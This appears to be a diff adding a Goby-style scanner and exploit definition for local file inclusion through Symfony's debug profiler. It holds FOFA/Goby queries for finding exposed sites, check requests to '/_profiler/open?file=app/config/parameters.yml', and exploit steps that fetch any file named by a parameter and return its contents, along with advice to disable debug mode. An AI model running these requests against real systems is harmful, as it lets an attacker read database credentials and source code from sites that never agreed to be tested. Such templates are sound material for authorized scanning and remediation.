@@ -1,0 +1,215 @@
+{
+  "Name": "Symfony framework debug Local File Inclusion",
+  "Description": "<p>The web application uses Symfony framework. Symfony Debug mode is enabled. Debug mode should be turned off in production environment, as it leads to disclosure of sensitive information about the web application.<br></p>",
+  "Product": "Symfony Framework",
+  "Homepage": "https://symfony.com/",
+  "DisclosureDate": "2022-03-23",
+  "Author": "sharecast",
+  "FofaQuery": "body=\"/vendor/symfony\" || body=\"Symfony Exception\"",
+  "GobyQuery": "body=\"/vendor/symfony\" || body=\"Symfony Exception\"",
+  "Level": "2",
+  "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
+  "Recommendation": "<p><br>disable debug mode,References: <a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a> </p>",
+  "References": [
+    "https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "fileName",
+      "type": "input",
+      "value": "app/config/parameters.yml",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "OR",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/app_dev.php/_profiler/open?file=app/config/parameters.yml",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "parameters:",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "<a class=\"anchor\" name=\"line1\">",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/_profiler/open?file=app/config/parameters.yml",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "parameters:",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "<a class=\"anchor\" name=\"line1\">",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [
+    "Local File Inclusion"
+  ],
+  "VulType": [
+    "Local File Inclusion"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "7",
+  "Translation": {
+    "CN": {
+      "Name": "Symfony framework debug 存在任意文件读取漏洞",
+      "Product": "Symfony Framework",
+      "Description": "<p>web应用程序使用Symfony框架。Symfony调试模式启用。调试模式应该在生产环境中关闭，因为它会导致有关web应用程序的敏感信息泄露。<br></p>",
+      "Recommendation": "<p>关闭调试模式，参考：<a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a></p>",
+      "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。\t<br></p>",
+      "VulType": [
+        "本地⽂件包含"
+      ],
+      "Tags": [
+        "本地⽂件包含"
+      ]
+    },
+    "EN": {
+      "Name": "Symfony framework debug Local File Inclusion",
+      "Product": "Symfony Framework",
+      "Description": "<p>The web application uses Symfony framework. Symfony Debug mode is enabled. Debug mode should be turned off in production environment, as it leads to disclosure of sensitive information about the web application.<br></p>",
+      "Recommendation": "<p><br>disable debug mode,References: <a href=\"https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode\">https://symfony.com/doc/4.4/configuration/front_controllers_and_kernel.html#debug-mode</a> </p>",
+      "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
+      "VulType": [
+        "Local File Inclusion"
+      ],
+      "Tags": [
+        "Local File Inclusion"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/app_dev.php/_profiler/open?file={{fileName}}",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/_profiler/open?file={{fileName}}",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    }
+  ]
+}
